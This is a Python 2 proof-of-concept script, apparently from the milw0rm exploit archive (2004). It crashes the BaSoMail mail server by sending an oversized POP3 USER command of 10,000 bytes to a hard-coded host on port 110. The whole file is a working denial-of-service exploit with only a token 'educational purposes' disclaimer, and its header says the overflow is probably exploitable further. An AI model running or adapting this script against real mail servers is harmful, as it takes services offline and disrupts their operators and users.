#########################################################
# BaSoMail Multiple Buffer Overflow DOS		 	#
# 24 Oct 2004 - muts 					#
# Probably exploitable - However, I lack sleep!        	#
#########################################################

import struct
import socket

print "\n\n######################################################"
print "\nBaSoMail Multiple Buffer Overflow DOS"
print "\nFound & coded by muts [at] whitehat.co.il"
print "\nAlmost all the SMTP and POP3 commands are prone to BO.\n" 
print "\nFor Educational Purposes Only!\n" 
print "\n\n######################################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Example buffer overflow 

buffer = '\x41'*10000

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.32',110))
	s.send('USER ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nRun this script again, and server should crash."
except:
	print "\nCould not connect to sever!"

# milw0rm.com [2004-10-26]
